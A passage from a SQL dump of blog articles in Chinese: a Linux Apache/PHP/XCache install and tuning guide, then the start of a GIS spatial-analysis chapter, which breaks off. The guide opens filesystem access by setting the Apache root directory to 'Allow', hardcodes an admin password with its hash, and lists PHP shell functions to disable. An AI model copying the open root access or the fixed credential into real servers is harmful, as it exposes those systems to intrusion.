#aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;&lt;div&gt;mkdir -p /usr/local/php/etc&lt;br /&gt;\r\n./configure \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--prefix=/usr/local/php&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-apxs2=/usr/local/apache2/bin/apxs&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-config-file-path=/usr/local/php/etc&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-mysql=/usr/local/mysql&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-libxml-dir=/usr/local/libxml2&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-gd=/usr/local/gd2&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-jpeg-dir&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-png-dir&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-bz2&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-freetype-dir&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-iconv-dir&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-zlib-dir &quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-openssll&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-mcrypt=/usr/local/libmcrypt&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-soap&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-gd-native-ttf&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-ftp&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-mbstring&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-exif&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--disable-ipv6&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--disable-cgi&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--disable-cli&quot; &lt;br /&gt;\r\nmake&lt;br /&gt;\r\nmake install&lt;br /&gt;\r\ncp php.ini-dist /usr/local/php/etc/php.ini&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n#sh install_php.sh&lt;br /&gt;\r\n7)安装Xcache&lt;br /&gt;\r\ntar -zxvf xcache-1.3.0.tar.gz&lt;br /&gt;\r\ncd xcache-1.3.0&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;/usr/local/php/bin/phpize \\&lt;br /&gt;\r\n./configure --enable-xcache \\&lt;br /&gt;\r\n--enable-xcache-coverager \\&lt;br /&gt;\r\n--with-php-config=/usr/local/php/bin/php-config \\&lt;br /&gt;\r\n--enable-inline-optimization --disable-debug&lt;/div&gt;\r\n&lt;/div&gt;\r\nvim /usr/local/php/etc/php.ini &lt;br /&gt;\r\n在最后添加以下内容&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;[xcache-common]&lt;br /&gt;\r\nzend_extension&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = /usr/local/php/lib/php/extensions/no-debug-non-zts-20060613/xcache.so&lt;br /&gt;\r\n&amp;nbsp; &lt;br /&gt;\r\n[xcache.admin]&lt;br /&gt;\r\nxcache.admin.user&amp;nbsp;&amp;nbsp; = &quot;admin&quot;&lt;br /&gt;\r\n;create md5 password: echo -n &quot;password&quot;| md5sum&lt;br /&gt;\r\nxcache.admin.pass&amp;nbsp;&amp;nbsp; = &quot;f3dfd37a03b1356d6380b41e524f903b&quot;&amp;nbsp; #password is hx10.com&lt;br /&gt;\r\n[xcache]&lt;br /&gt;\r\n; Change xcache.size to tune the size of the opcode cache&lt;br /&gt;\r\nxcache.size&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 24M&lt;br /&gt;\r\nxcache.shm_scheme&amp;nbsp;&amp;nbsp; = &quot;mmap&quot;&lt;br /&gt;\r\nxcache.count&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 4&lt;br /&gt;\r\nxcache.slots&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 8K&lt;br /&gt;\r\nxcache.ttl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 0&lt;br /&gt;\r\nxcache.gc_interval&amp;nbsp; = 0&lt;br /&gt;\r\n&amp;nbsp; &lt;br /&gt;\r\n; Change xcache.var_size to adjust the size of variable cache&lt;br /&gt;\r\nxcache.var_size&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 8M&lt;br /&gt;\r\nxcache.var_count&amp;nbsp;&amp;nbsp;&amp;nbsp; = 1&lt;br /&gt;\r\nxcache.var_slots&amp;nbsp;&amp;nbsp;&amp;nbsp; = 8K&lt;br /&gt;\r\nxcache.var_ttl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 0&lt;br /&gt;\r\nxcache.var_maxttl&amp;nbsp;&amp;nbsp; = 0&lt;br /&gt;\r\nxcache.var_gc_interval =&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 300&lt;br /&gt;\r\nxcache.test&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = Off&lt;br /&gt;\r\nxcache.readonly_protection = On&lt;br /&gt;\r\nxcache.mmap_path&amp;nbsp;&amp;nbsp;&amp;nbsp; = &quot;/tmp/xcache&quot;&lt;br /&gt;\r\nxcache.coredump_directory =&amp;nbsp;&amp;nbsp; &quot;&quot;&lt;br /&gt;\r\nxcache.cacher&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = On&lt;br /&gt;\r\nxcache.stat&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = On&lt;br /&gt;\r\nxcache.optimizer&amp;nbsp;&amp;nbsp;&amp;nbsp; = Off&lt;div&gt;[xcache.coverager]&lt;br /&gt;\r\nxcache.coverager&amp;nbsp;&amp;nbsp;&amp;nbsp; = On&lt;br /&gt;\r\nxcache.coveragedump_directory = &quot;&quot;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n8)安装Zend Optimizer&lt;br /&gt;\r\ntar -zxvf tar -zxvf ZendOptimizer-3.3.9-linux-glibc23-i386.tar.gz&lt;br /&gt;\r\nmv ZendOptimizer-3.3.9-linux-glibc23-i386 /usr/local/Zend&lt;br /&gt;\r\ncp /usr/local/Zend/data/5_2_x_comp/ZendOptimizer.so /usr/local/Zend/&amp;nbsp; (因为php是5.2)&lt;br /&gt;\r\nvim /usr/local/php/etc/php.ini&amp;nbsp; 最后一行加入以下内容&lt;/div&gt;\r\n&lt;div&gt;&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;zend_optimizer.optimization_level=15&lt;br /&gt;\r\nzend_extension=/usr/local/Zend/ZendOptimizer.so&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;9)整合Apache与PHP及系统初化配置&lt;br /&gt;\r\nvim /usr/local/apache2/conf/httpd.conf&lt;br /&gt;\r\n查找AddType application/x-gzip .gz .tgz,在该行下面添加&lt;br /&gt;\r\nAddType application/x-httpd-php .php&lt;br /&gt;\r\n查找DirectoryIndex index.html 把该行修改成&lt;/div&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;DirectoryIndex index.html index.htm index.php&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;找到&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;#Include conf/extra/httpd-mpm.conf&lt;br /&gt;\r\n#Include conf/extra/httpd-info.conf&lt;br /&gt;\r\n#Include conf/extra/httpd-vhosts.conf&amp;nbsp;&lt;div&gt;#Include conf/extra/httpd-default.conf&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n去掉这4行前面的#&lt;br /&gt;\r\n注意：以上 4 个扩展配置文件中的设置请按照相关原则进行合理配置！&lt;/div&gt;\r\n&lt;div&gt;vim /usr/local/apache2/conf/extra/httpd-vhosts.conf&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;&amp;lt;VirtualHost *:80&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ServerAdmin &lt;a href=&quot;mailto:webmaster@hx10.com&quot;&gt;webmaster@hx10.com&lt;/a&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; DocumentRoot &quot;/www/wwwroot/&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ServerName mail.520.com&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ServerAlias &lt;a href=&quot;http://www.dummy-host.example.com/&quot;&gt;www.dummy-host.example.com&lt;/a&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ErrorLog &quot;logs/dummy-host.example.com-error_log&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; CustomLog &quot;logs/dummy-host.example.com-access_log&quot; common&lt;br /&gt;\r\n&amp;lt;/VirtualHost&amp;gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n新建一个虚拟主机&lt;br /&gt;\r\nmkdir -p /www/wwwroot/&lt;br /&gt;\r\n然后把探针放到这个目录&lt;/div&gt;\r\n&lt;div&gt;vim /usr/local/apache2/conf/httpd.conf&lt;br /&gt;\r\n找到&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;&amp;lt;Directory /&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Options FollowSymLinks&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; AllowOverride None&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Order deny,allow&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Deny from all&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //把这里的Deny改成Allow&lt;br /&gt;\r\n&amp;lt;/Directory&amp;gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;找到&lt;br /&gt;\r\n#ServerName &lt;a href=&quot;http://www.example.com/&quot;&gt;www.example.com:80&lt;/a&gt;&amp;nbsp; 在这一行后面加入下面一行&lt;br /&gt;\r\nServerName 127.0.0.1:80&lt;/div&gt;\r\n&lt;div&gt;找到&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;User httpd&lt;br /&gt;\r\nGroup httpd&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n把原来的daemon修改成httpd&lt;/div&gt;\r\n&lt;div&gt;Apache 运行账户&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; httpd:httpd&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;chown -R httpd:httpd /www/wwwroot&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n重启apache&lt;br /&gt;\r\n# /usr/local/apache2/bin/apachectl restart&lt;br /&gt;\r\n输入探针的地址访问&lt;br /&gt;\r\n&lt;div&gt;10)安全和性能优化&lt;br /&gt;\r\nvim /usr/local/php/etc/php.ini&lt;br /&gt;\r\n查找disable_functions =&lt;br /&gt;\r\n等号后面加入以下参数，注意不能换行&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;phpinfo,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,&lt;/div&gt;\r\n&lt;div&gt;ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,get_cfg_var&lt;/div&gt;\r\n&lt;/div&gt;\r\n查找以下2项,把on改成off&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;expose_php = Off&lt;br /&gt;\r\ndisplay_errors = Off&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;vim /usr/local/apache2/conf/extra/httpd-default.conf&amp;nbsp; 修改后的内容如下&lt;/div&gt;\r\n&lt;div&gt;&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;Timeout 15&lt;br /&gt;\r\nKeepAlive Off&lt;br /&gt;\r\nMaxKeepAliveRequests 50&lt;br /&gt;\r\nKeepAliveTimeout 5&lt;br /&gt;\r\nUseCanonicalName Off&lt;br /&gt;\r\nAccessFileName .htaccess&lt;br /&gt;\r\nServerTokens Prod&lt;br /&gt;\r\nServerSignature off&lt;br /&gt;\r\nHostnameLookups Off&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;vim /usr/local/apache2/conf/extra/httpd-mpm.conf&amp;nbsp; 修改一个模块后的内容如下&lt;br /&gt;\r\n原来的配置如下：&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;&amp;lt;IfModule mpm_prefork_module&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; ServerLimit 256&amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; StartServers 5&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; MinSpareServers 5&lt;br /&gt;\r\n&amp;nbsp; MaxSpareServers 10 &lt;br /&gt;\r\n&amp;nbsp; MaxClients 256&lt;br /&gt;\r\n&amp;nbsp; MaxRequestsPerChild 0&lt;br /&gt;\r\n&amp;lt;/IfModule&amp;gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n修改后配置如下&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;&amp;lt;IfModule mpm_prefork_module&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ServerLimit&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2000&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; StartServers&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 10&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; MinSpareServers&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;10&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; MaxSpareServers&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;15&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; MaxClients&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2000&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; MaxRequestsPerChild&amp;nbsp;&amp;nbsp; 10000&lt;br /&gt;\r\n&amp;lt;/IfModule&amp;gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;查看是什么模式&lt;br /&gt;\r\n/usr/local/apache2/bin/apachectl -l&lt;br /&gt;\r\n如果出现prefork.c那就说明是prefork模式&lt;br /&gt;\r\n关于详细的参数调整，查看&lt;a href=&quot;http://zhengdl126.javaeye.com/blog/450620&quot;&gt;http://zhengdl126.javaeye.com/blog/450620&lt;/a&gt;&lt;/div&gt;\r\n&lt;div&gt;11)将apache,mysql安装为系统服务&lt;br /&gt;\r\n# cp /usr/local/apache2/bin/apachectl /etc/rc.d/init.d/httpd&lt;br /&gt;\r\n#cd /etc/rc.d/init.d&lt;br /&gt;\r\n#vi /etc/rc.d/init.d/httpd&lt;br /&gt;\r\n添加以下两行内容(在#!/bin/sh下面)&lt;br /&gt;\r\n# chkconfig: 2345 10 90&lt;br /&gt;\r\n# description: Activates/Deactivates Apache Web Server&lt;br /&gt;\r\n最后，运行chkconfig 把Apache 添加到系统的启动服务组里面：&lt;br /&gt;\r\n# chkconfig --add httpd&lt;br /&gt;\r\n# chkconfig httpd on&lt;/div&gt;\r\n&lt;div&gt;mysql前面已经加入到服务启动，不需要此步骤&lt;br /&gt;\r\ncp /usr/local/mysql/support-files/mysql.server /etc/rc.d/init.d/mysqld&lt;br /&gt;\r\ncd /etc/rc.d/init.d&lt;br /&gt;\r\nchkconfig --add mysqld&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //ntsysv检查Mysql是否已经加载到服务启动&lt;br /&gt;\r\nservice mysqld start/stop&lt;br /&gt;\r\n/usr/local/mysql/bin/mysqladmin -uroot -p shutdown&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //关闭mysql&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;p&gt;本文出自 “&lt;a href=&quot;http://hx100.blog.51cto.com/&quot;&gt;无云安全技术站&lt;/a&gt;” 博客，请务必保留此出处&lt;a href=&quot;http://hx100.blog.51cto.com/44326/359296&quot;&gt;http://hx100.blog.51cto.com/44326/359296&lt;/a&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n', 1, 1, 0, 0, 1305094358, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(110, 1, '第五章 空间查询与空间分析', '', '', '&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&lt;font face=&quot;华文新魏&quot;&gt;&lt;font color=&quot;#006600&quot; face=&quot;隶书&quot;&gt;本章概述&lt;/font&gt;&lt;font color=&quot;#006600&quot; face=&quot;隶书&quot;&gt;：&lt;/font&gt;&lt;font color=&quot;#cc0033&quot;&gt;GIS不仅仅是一个地理数据的存贮系统，它还提供了丰富的数据查询功能。更重要的，GIS有自己的复杂而科学的空间分析模型和工具，使得我们可以通过GIS的空间分析功能，获取隐藏在GIS数据之中的信息和关系。地理信息系统集成了多学科的最新技术，如关系数据库管理、高效图形算法、插值、区划和网络分析，为空间分析提供了强大的工具，使得过去复杂困难的高级空间分析任务变得简单易行。本章将介绍GIS数据查询的基本知识和常用的GIS空间分析模型及其算法。&lt;br /&gt;\r\n&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;br /&gt;\r\n                                                                                                    &lt;span class=&quot;floatright gray&quot;&gt;浏览：2203&lt;/span&gt;                                    &lt;span class=&quot;green&quot;&gt;                                        2008-07-02 17:33&lt;/span&gt;&amp;nbsp;来自&amp;nbsp;&lt;b&gt;&lt;span id=&quot;userTitle&quot; class=&quot;sup&quot;&gt;【组长】&lt;/span&gt;&lt;a href=&quot;http://home.cnblogs.com/u/lijigang/&quot; class=&quot;blue&quot;&gt;刚刚&lt;/a&gt;                                            &lt;a href=&quot;http://space.cnblogs.com/msg/send/%e5%88%9a%e5%88%9a&quot; title=&quot;给此人发送站内短消息&quot; class=&quot;sendMsg2This&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/a&gt;: &lt;/b&gt;                                    &lt;br /&gt;\r\n                                    &lt;div class=&quot;Content&quot;&gt;                                        &lt;h1 align=&quot;center&quot;&gt;&lt;font size=&quot;5&quot; color=&quot;#000080&quot;&gt;第五章 空间查询与空间分析&lt;/font&gt;&lt;/h1&gt;\r\n&lt;p&gt;&lt;font size=&quot;4&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font face=&quot;华文新魏&quot;&gt;&lt;font color=&quot;#006600&quot; face=&quot;隶书&quot;&gt;本章概述&lt;/font&gt;&lt;font color=&quot;#006600&quot; face=&quot;隶书&quot;&gt;：&lt;/font&gt;&lt;font color=&quot;#cc0033&quot;&gt;GIS不仅仅是一个地理数据的存贮系统，它还提供了丰富的数据查询功能。更重要的，GIS有自己的复杂而科学的空间分析模型和工具，使得我们可以通过GIS的空间分析功能，获取隐藏在GIS数据之中的信息和关系。地理信息系统集成了多学科的最新技术，如关系数据库管理、高效图形算法、插值、区划和网络分析，为空间分析提供了强大的工具，使得过去复杂困难的高级空间分析任务变得简单易行。本章将介绍GIS数据查询的基本知识和常用的GIS空间分析模型及其算法。&lt;/font&gt;&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;i&gt;&lt;h3&gt;&lt;font color=&quot;#0000ff&quot;&gt;§5.1 空间数据的查询&lt;/font&gt;&lt;/h3&gt;\r\n&lt;/i&gt;&lt;p&gt;&lt;font size=&quot;4&quot; face=&quot;宋体&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;本节将介绍空间数据查询的含义及图形查询、属性查询、混合查询、模糊查询等几种主要的查询方式，以及如何根据需求来控制查询结果的显示方式。&lt;/font&gt;&lt;/p&gt;\r\n&lt;i&gt;&lt;h3&gt;&lt;font color=&quot;#0000ff&quot;&gt;§5.2 空间数据的统计分析&lt;/font&gt;&lt;/h3&gt;\r\n&lt;/i&gt;&lt;p&gt;&lt;font size=&quot;4&quot; face=&quot;宋体&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;讲述空间数据统计分析中基本统计量的计算和常用统计数据的分类分级算法。&lt;/font&gt;&lt;/p&gt;\r\n&lt;i&gt;&lt;h3&gt;&lt;font color=&quot;#0000ff&quot;&gt;§5.3 数字高程模型分析&lt;/font&gt;&lt;/h3&gt;\r\n&lt;/i&gt;&lt;p&gt;&lt;font size=&quot;4&quot; face=&quot;宋体&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;讲述基于数字高程模型的信息提取、坡度分析、坡面分析、剖面分析和通视性分析、并介绍具体的算法。&lt;/font&gt;&lt;/p&gt;\r\n&lt;i&gt;&lt;h3&gt;&lt;font color=&quot;#0000ff&quot;&gt;§5.4 空间数据的叠置分析&lt;/font&gt;&lt;/h3&gt;\r\n&lt;/i&gt;&lt;p&gt;&lt;font size=&quot;4&quot; face=&quot;宋体&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;空间叠置分析是GIS提取空间隐含信息的重要手段之一，本课介绍基于栅格和基于矢量数据结构的叠置分析方法，包括矢量数据的点、线、面两两叠置和栅格数据的单层和多层叠置分析。&lt;/font&gt;&lt;/p&gt;\r\n&lt;i&gt;&lt;h3&gt;&lt;font color=&quot;#0000ff&quot;&gt;§5.5 空间数据的缓冲区分析&lt;/font&gt;&lt;/h3&gt;\r\n&lt;/i&gt;&lt;p&gt;&lt;font size=&quot;4&quot; face=&quot;宋体&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;缓冲区分析是解决空间实体邻接度问题的有效方法，本课介绍基于栅格和基于矢量数据结构的缓冲区生成算法。&lt;/font&gt;&lt;/p&gt;\r\n&lt;i&gt;&lt;h3&gt;&lt;font color=&quot;#0000ff&quot;&gt;§5.6 泰森多边形分析&lt;/font&gt;&lt;/h3&gt;\r\n&lt;/i&gt;&lt;p&gt;&lt;font size=&quot;4&quot; face=&quot;宋体&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;泰森多边形对于GIS的空间划分、插值等具有重要意义，本节介绍泰森多边形、Delaulay三角形的定义、特性及生成算法。&lt;/font&gt;&lt;/p&gt;\r\n&lt;i&gt;&lt;h3&gt;&lt;font color=&quot;#0000ff&quot;&gt;§5.7 空间数据的网络分析&lt;/font&gt;&lt;/h3&gt;\r\n&lt;/i&gt;&lt;p&gt;&lt;font size=&quot;4&quot; face=&quot;宋体&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;网络是以图论为工具模拟现实信息流通的通道，并解决路径优化、资源配给等运筹问题，网络分析具有重要的实际意义。本课讲述网络图论基础、路径分析及网络定位及分配模型。&amp;nbsp;&lt;/font&gt;&lt;/p&gt;\r\n&lt;i&gt;&lt;h3&gt;&lt;font color=&quot;#ff6600&quot;&gt;§5.8 空间距离的量算&lt;/font&gt;&lt;/h3&gt;\r\n&lt;/i&gt;&lt;p&gt;&lt;font size=&quot;4&quot; face=&quot;宋体&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;空间距离量算是许多空间分析的基础，在此介绍点、线、面实体之间的距离量算&lt;/font&gt;&lt;/p&gt;\r\n&lt;i&gt;&lt;h3&gt;&lt;font color=&quot;#0000ff&quot;&gt;§5.9 空间分析模型&lt;/font&gt;&lt;/h3&gt;\r\n&lt;/i&gt;&lt;p&gt;&lt;font size=&quot;4&quot; 